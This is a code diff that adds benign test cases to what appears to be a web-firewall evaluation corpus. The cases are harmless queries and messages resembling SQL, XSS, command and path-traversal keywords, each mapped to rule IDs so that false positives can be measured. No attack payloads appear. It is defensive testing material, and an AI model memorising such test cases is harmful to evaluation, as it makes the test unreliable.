+        _benign("script-kiddie-docs", "POST", "/docs/search", "ARGS", "q", "history of the script tag in html4", "script tag in html4", ["941110"], "xss"),
+        _benign("svg-logo", "POST", "/articles", "ARGS", "body", '<img src="/brand.svg" alt="brand">', "/brand.svg", ["941110"], "xss"),
+        _benign("confirm-attendance", "POST", "/support", "ARGS", "message", "please confirm attendance for Friday", "confirm attendance", ["941110"], "xss"),
+        _benign("eval-coursework", "POST", "/docs/search", "ARGS", "q", "teacher eval form for the coursework", "teacher eval form", ["933150"], "php"),
+        _benign("include-header", "POST", "/docs/search", "ARGS", "q", "include a header on every page of the report", "include a header on every page", ["933130"], "php"),
+        _benign("system-design", "POST", "/docs/search", "ARGS", "q", "system design interview notes", "system design interview notes", ["933150"], "php"),
+        _benign("file-include-readme", "GET", "/vulnerabilities/fi/", "ARGS", "page", "readme", "readme", ["930120"], "lfi"),
+        _benign("ping-hostname-docs", "POST", "/docs/search", "ARGS", "q", "ping hostname to check dns in the runbook", "ping hostname to check dns", ["932100"], "rce"),
+        _benign("or-conjunction", "GET", "/catalog/search", "ARGS", "q", "cotton or linen shirts", "cotton or linen shirts", ["942130"], "sqli"),
+        _benign("in-stock", "GET", "/catalog/search", "ARGS", "q", "in stock navy jacket", "in stock navy jacket", ["942100"], "sqli"),
+        _benign("like-this", "GET", "/catalog/search", "ARGS", "q", "more items like this tote", "like this tote", ["942100"], "sqli"),
+        _benign("between-sizes", "GET", "/catalog/search", "ARGS", "q", "shoes between size 8 and 10", "between size 8 and 10", ["942100"], "sqli"),
+        _benign("not-null-docs", "POST", "/docs/search", "ARGS", "q", "not null constraint in the sql primer", "not null constraint", ["942100"], "sqli"),
+        _benign("create-account-copy", "POST", "/articles", "ARGS", "body", "<p>Create your account to continue.</p>", "Create your account", ["941160"], "xss"),
+        _benign("bash-tutorial-and", "POST", "/docs/search", "ARGS", "q", "using && in bash to chain commands in the tutorial", "&& in bash to chain commands", ["932100"], "rce"),
+        _benign("backslash-windows-docs", "POST", "/support", "ARGS", "message", r"path uses backslash like C:\Temp\out.csv", r"C:\Temp\out.csv", ["930100"], "lfi"),
+        _benign("dotdot-explanation", "POST", "/docs/search", "ARGS", "q", "relative paths may contain .. segments when normalizing", ".. segments when normalizing", ["930100"], "lfi"),
+        _benign("http-example-url", "POST", "/bookmarks", "ARGS", "url", "https://example.test/docs/sql/select.html", "https://example.test/docs/sql/select.html", ["931130", "942100"], "rfi"),
+        _benign("cookie-theme", "GET", "/index.php", "REQUEST_COOKIES", "theme", "dark", "dark", ["942100"], "sqli"),
+        _benign("q-select-course", "GET", "/catalog/search", "ARGS", "q", "select course notebook", "select course notebook", ["942100"], "sqli"),
+        _benign("union-made", "GET", "/catalog/search", "ARGS", "q", "union made denim jacket", "union made denim jacket", ["942190"], "sqli"),
+        _benign("exec-board", "POST", "/docs/search", "ARGS", "q", "exec board meeting minutes", "exec board meeting minutes", ["932150"], "rce"),
+        _benign("id-parameter-name", "GET", "/catalog/search", "ARGS", "q", "product id labels for the warehouse", "product id labels", ["932105"], "rce"),
+        _benign("passwd-reset-ticket", "POST", "/support", "ARGS", "message", "passwd reset completed for the finance user", "passwd reset completed", ["930120"], "lfi"),
+        _benign("xml-update-docs", "POST", "/docs/search", "ARGS", "q", "how to update xml invoices in the handbook", "update xml invoices", ["942100"], "sqli"),
+        _benign("concat-names", "POST", "/customers", "ARGS", "name", "Mary-Jane O'Connor-Smith", "O'Connor-Smith", ["942100"], "sqli"),
+        _benign("html-ul", "POST", "/articles", "ARGS", "body", "<ul><li>first</li><li>second</li></ul>", "<ul><li>first</li>", ["941160"], "xss"),
+        _benign("sql-primer-select-where", "POST", "/docs/search", "ARGS", "q", "sql primer: select name from users where id = 1", "select name from users where id = 1", ["942100", "942140", "942190"], "sqli"),
+        _benign("escaped-script-tag-docs", "POST", "/articles", "ARGS", "body", "<p>Write <code>&lt;script&gt;</code> tags only in code samples.</p>", "<code>&lt;script&gt;</code>", ["941160", "941100"], "xss"),
+        _benign("union-select-hoodie", "GET", "/catalog/search", "ARGS", "q", "union select hoodie and drop shoulder tee", "union select hoodie and drop shoulder tee", ["942190", "942360", "942100"], "sqli"),
+        _benign("support-path-and-quote", "POST", "/support", "ARGS", "message", "export failed for C:\\Reports\\Q3 'final'.xlsx", "C:\\Reports\\Q3 'final'.xlsx", ["930100", "942100"], "lfi"),
+        _benign("dvwa-login-get", "GET", "/login.php", "ARGS", "username", "", "", ["920300"], "protocol"),
     ]
     return rows
 
@@ -481,6 +525,7 @@ def all_cases() -> list[CorpusCase]:
         + rce_attacks()
         + lfi_attacks()
         + rfi_php_protocol_misc()
+        + profiled_route_attacks()
         + benign_cases()
     )
     seen: set[str] = set()
